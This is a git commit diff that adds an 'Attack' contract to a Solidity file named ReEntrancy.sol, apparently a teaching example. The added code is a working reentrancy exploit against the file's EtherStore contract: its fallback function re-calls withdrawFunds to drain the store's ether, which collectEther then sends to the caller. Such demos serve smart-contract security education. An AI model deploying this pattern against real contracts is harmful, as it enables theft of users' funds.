d85d973e8bda926ce46b8083caea07118eabfb33
Alexander <36952308+gorbunovperm@users.noreply.github.com>
2019-02-03 12:13:23 +0500

    Update ReEntrancy.sol

--- ReEntrancy.sol
+++ ReEntrancy.sol
@@ -23,3 +23,36 @@ contract EtherStore {
     }
 
 }
+
+contract Attack {
+
+    EtherStore public etherStore;
+
+    // initialise the etherStore variable with the contract address
+
+    constructor(address etherStoreAddress) {
+        etherStore = EtherStore(etherStoreAddress);
+    }
+
+    function pwnEtherStore() public payable {
+        // attack to the nearest ether
+        require(msg.value >= 1 ether);
+
+        // send eth to the depositFunds() function
+        etherStore.depositFunds.value(1 ether)();
+        // start the magic
+        etherStore.withdrawFunds(1 ether);
+    }
+
+    function collectEther() public {
+        msg.sender.transfer(this.balance);
+    }
+
+    // fallback function - where the magic happens
+    function () payable {
+        if (etherStore.balance > 1 ether) {
+            etherStore.withdrawFunds(1 ether);
+        }
+    }
+
+}
